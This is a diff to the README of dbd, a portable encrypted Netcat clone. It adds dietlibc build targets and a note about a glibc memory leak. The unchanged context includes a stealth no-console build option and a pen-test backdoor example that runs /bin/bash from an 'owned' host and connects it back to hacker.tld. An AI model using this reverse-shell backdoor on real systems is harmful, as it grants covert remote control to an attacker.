@@ -18,11 +18,13 @@ dbd is a Netcat-clone, designed to be portable and offer strong encryption. It r
 
 	$ make
 	usage:
-	  make unix     - Linux, NetBSD, FreeBSD, OpenBSD
-	  make unix32  - Linux, NetBSD, FreeBSD, OpenBSD 32-bit
-	  make sunos    - SunOS (Solaris)
-	  make win32    - native win32 console app (w/ Cygwin + MinGW)
-	  make win32bg  - create a native win32 no-console app (w/ Cygwin + MinGW)
+	  make unix       - Linux, NetBSD, FreeBSD, OpenBSD
+	  make dietunix   - Linux, NetBSD, FreeBSD, OpenBSD (see Using dietlibc)
+	  make unix32     - Linux, NetBSD, FreeBSD, OpenBSD 32-bit
+	  make dietunix32 - Linux, NetBSD, FreeBSD, OpenBSD 32-bit (see Using dietlibc)
+	  make sunos      - SunOS (Solaris)
+	  make win32      - native win32 console app (w/ Cygwin + MinGW)
+	  make win32bg     - create a native win32 no-console app (w/ Cygwin + MinGW)
 	  make win32bg CFLAGS=-DSTEALTH - stealthy no-console app
 	  make mingw    - native win32 console app (w/ MinGW MSYS)
 	  make mingwbg  - native win32 no-console app (w/ MinGW MSYS)
@@ -98,6 +100,9 @@ Use dbd as a pen-test backdoor:
 or under Unix-like OSes:
 
 	root@owned# ./dbd -r1800 -Don -e /bin/bash hacker.tld 993
+
+###Using dietlibc
+dbd can be built using dietlibc on UNIX platforms (dietlibc-dev must be installed). This usually results in a larger binary (this needs fixed down the road; a lot of the bloat is in printf). However, using dietlibc works around a memory leak in glibc's implentation of strdup which results in dbd leaking about 10 bytes of memory.
 
 ###HARD CODING OPTIONS
 
